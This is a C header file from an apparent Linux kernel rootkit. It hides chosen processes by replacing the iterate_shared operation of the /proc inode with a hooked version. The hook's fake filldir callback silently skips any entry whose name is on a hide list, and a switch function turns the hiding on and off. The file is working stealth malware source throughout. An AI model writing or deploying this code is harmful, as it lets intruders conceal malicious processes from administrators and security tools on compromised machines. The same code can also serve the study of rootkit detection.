#ifndef HIDE_PROCESS_KITE
    #define HIDE_PROCESS_KITE
    #include <linux/proc_fs.h>
    #include <linux/namei.h>
    #include <linux/path.h>
    #include "linked_list.h"



static struct dir_context *backup_ctx; // backup /proc 's original dir_context(containing original filldir)
static const struct file_operations *backup_fops; // backup /proc 's original fops (containing the iterate_shared function that is called on the inode when opening)
static struct inode *proc_inode; // placeholder for the inode of /proc
static struct file_operations proc_fops; // placeholder for the fops of /proc
static int hide_process_active = 0; // active switch


// function to replace the original filldir, same type as filldir_t
static bool hack_filldir(struct dir_context *ctx, const char *name, int len, loff_t off, u64 ino, unsigned intd_type){
    if(find_node(&pids_to_hide, (char *)name) == 0){ // check if process is for hiding
        return 0;
    }
    return backup_ctx->actor(backup_ctx, name, len, off, ino, intd_type); // call the original function
    
}

// creating a fake dir_context to contain our filldir
struct dir_context fake_ctx = {
    .actor = hack_filldir,
};

/* fake iterate shared function, copy the position of the context in file, store the original to be used in our filldir, 
pass the fake context to the original iterate_shared where our filldir will be called,
set the original context's position relative to dir to the new one after the fake filldir was called*/
static int hack_iterate_shared(struct file *file, struct dir_context *ctx){
    int result = 0;
    fake_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_fops->iterate_shared(file, &fake_ctx);
    ctx->pos = fake_ctx.pos;
    return result;
}

// get /proc 's inode and backups its fops, then changes the iterate_shared field to our iterate_shared
static int hide_process(void){
    struct path p;
    kern_path("/proc", 0, &p); // get path details(inode)
    proc_inode = p.dentry->d_inode;
    proc_fops = *proc_inode->i_fop;
    backup_fops = proc_inode->i_fop;
    proc_fops.iterate_shared = hack_iterate_shared;
    proc_inode->i_fop = &proc_fops;
    hide_process_active = 1;
    return 1;
}

// change the inode 's fops of /proc back to the original
static void show_process(void){
    struct path p;
    struct inode *proc_inode;
    kern_path("/proc", 0, &p); // get path details
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_fops;
    hide_process_active = 0;
}

//switch between hiding/unhiding the requested processes
static void switch_hide_process(void){
    if(hide_process_active == 0){
        hide_process();
    }
    else{
        show_process();
    }
}
#endif